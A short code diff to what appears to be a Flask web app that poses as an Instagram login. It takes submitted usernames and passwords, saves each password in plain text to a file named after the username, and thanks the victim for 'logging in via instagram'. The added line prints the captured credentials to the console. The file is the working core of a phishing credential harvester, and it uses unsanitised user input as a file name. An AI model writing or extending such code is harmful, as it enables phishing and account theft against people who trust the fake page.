@@ -7,6 +7,7 @@ def index():
     if request.method == 'POST':
         username = request.form['username']
         password = request.form['password']
+        print(username,password)
         with open(f"{username}.txt", "w") as f:
             f.write(password)
         return "<a href='https://www.instagram.com/'>Thank you for logging in via instagram. Click here to redirect to your account.</a>"
